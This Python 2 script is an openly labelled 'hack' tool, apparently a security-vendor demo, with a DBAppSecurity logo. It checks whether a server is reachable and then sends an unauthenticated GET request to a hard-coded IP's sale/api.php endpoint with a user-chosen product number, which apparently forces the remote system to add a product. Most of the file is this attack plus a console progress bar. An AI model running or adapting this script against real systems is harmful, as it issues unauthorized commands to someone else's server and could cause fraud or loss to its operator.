# coding=utf-8

import requests
import sys
import time

def get_new_pro(SlotNo):
	bar = ProgressBar(total = 4)
	bar.move()
	bar.log('Checking if the Server is alive...')
	if try_head():
		time.sleep(1)
		bar.log('\nYes! Server is alive\n')
	else:
		bar.log('No! Server is down. program will break.')
		print "\n\n利用失败"
		return 
	bar.move()
	bar.log('Try to send command to remote server...')
	time.sleep(2)
	try:
		requests.get("http://120.25.156.28/sale/api.php?new_pro="+SlotNo)
		bar.log('\n\nSend success!\n')
	except:
		print "\n\n添加失败"
		return
	bar.move()
	bar.log('waiting for response ...')
	time.sleep(1)
	bar.move()
	bar.log('All done.')
	# print "\n\n添加成功"
def try_head():
	try:
		status = requests.head("http://120.25.156.28/sale/api.php").status_code
		if status == 200:
			return True
	except:
		return False
def print_logo():
	print """\n\n\033[1;32;40m.---. .-.                         .--.                         _  .-.       
: .  :: :                        : .--'                       :_;.' `.      
: :: :: `-.  .--.  .---. .---.   `. `.  .--.  .--. .-..-..--. .-.`. .'.-..-.
: :; :' .; :' .; ; : .; `: .; `   _`, :' '_.''  ..': :; :: ..': : : : : :; :
:___.'`.__.'`.__,_;: ._.': ._.'  `.__.'`.__.'`.__.'`.__.':_;  :_; :_; `._. ;
                   : :   : :                                           .-. :
                   :_;   :_;                                           `._.'\033[0m
                   				(dbappsecurity © Copyright Reserved 2019)\n\n"""
def help():
	return """\n\nInput the number of product what you want .\nThis program will auto connect to server and hack it !
enjoy it :)\n\n
	"""
# def print_status():
# 	bar = ProgressBar(total = 10)
# 	for i in range(10):
# 			bar.move()
# 			bar.log('We have arrived at: ' + str(i + 1))
# 			time.sleep(1)
class ProgressBar:
	def __init__(self, count = 0, total = 0, width = 50):
		self.count = count
		self.total = total
		self.width = width
	def move(self):
		self.count += 1
	def log(self, s):
		sys.stdout.write(' ' * (self.width + 11) + '\r')
		sys.stdout.flush()
		print s
		progress = self.width * self.count / self.total
		sys.stdout.write('{0:3}/{1:3}: '.format(self.count, self.total))
		sys.stdout.write('['+'█' * progress + '-' * (self.width - progress) + ']\r')
		if progress == self.width:
		    sys.stdout.write('\n')
		sys.stdout.flush()


if __name__ == '__main__':
	print_logo()
	while True:
		SlotNo = raw_input("Input what you want.\n\033[1;31;40mroot@dbapp:/\033[0m# ")
		if SlotNo == "exit" or SlotNo == "quit":
			break
		if SlotNo == "help":
			print help()
			continue
		if SlotNo.isdigit():
			get_new_pro(SlotNo)
		else:
			print "Input the product's No. you want."
	print "Bye!"
